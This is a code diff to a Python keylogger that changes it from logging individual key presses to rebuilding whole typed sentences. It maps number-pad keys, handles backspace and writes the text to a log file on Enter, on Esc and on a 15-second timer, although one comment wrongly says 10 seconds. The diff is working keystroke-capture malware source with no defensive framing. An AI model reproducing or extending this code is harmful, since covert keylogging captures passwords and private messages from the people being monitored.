@@ -36,36 +36,55 @@ logging.basicConfig(
 )
 
 #global functions for buffering
-keystroke_buffer = [] 
+current_entry = [] 
 buffer_lock = Lock() #to ensure thread-safe access to the buffer
-logging_interval = 5 #log every 5 seconds
+logging_interval = 15 #log every 10 seconds
+number_pad = {
+    96: '0', 97: '1',  98: '2', 99: '3', 100: '4', 101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
+    106: '*', 107: '+', 109: '-', 110: '.', 111: '/'
+}
 
 #function for common keys
 def press_key(key):
     with buffer_lock:
-        if key not in pressed_keys: #check if the key is pressed    
-            keystroke_buffer.append(f"K.Pressed: {key}")
-            pressed_keys.add(key) #add the keys pressed
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                current_entry.append(key.char)
+            
+            elif hasattr(key, 'vk') and key.vk in number_pad:
+                current_entry.append(number_pad[key.vk])  # Log NumPad keys correctly
+
+            elif key == Key.space:
+                current_entry.append(" ")  # Log space as a space character
+            
+            elif key == Key.enter:
+                full_sentence = "".join(current_entry)  # Log enter as a new line
+                logging.info(full_sentence)  # Log the full sentence before the new line
+                current_entry.clear()  # Clear the current entry after logging
+            
+            elif key == Key.backspace:
+                if current_entry:
+                    current_entry.pop()  # Remove the last character from the buffer
+
+        except Exception as e:
+            logging.error(f"Error processing key press: {e}")
 
 #function for special keys
 def release(key):
-    with buffer_lock:    
-        if key in pressed_keys: #check if the key pressed
-            keystroke_buffer.append(f"K.Released: {key}") #logs of a released key to the file
-            pressed_keys.remove(key) #remove from the set of pressed keys
-
-    #delete this when the keylogger is complete
-    if key == Key.esc: #If esc key is pressed the keylogger will stop
+    if key == Key.esc:  # Stop listener on 'Esc' key
+        with buffer_lock:
+            if current_entry:
+                logging.info("".join(current_entry))
+                current_entry.clear()
         return False
 
 def log_keystrokes():
     while True:
         time.sleep(logging_interval)
         with buffer_lock:
-            if keystroke_buffer:
-                for keystroke in keystroke_buffer:
-                    logging.info(keystroke)
-                keystroke_buffer.clear()
+            if current_entry:
+                logging.info("".join(current_entry))
+                current_entry.clear()
 
 def start_listener(): 
     try:
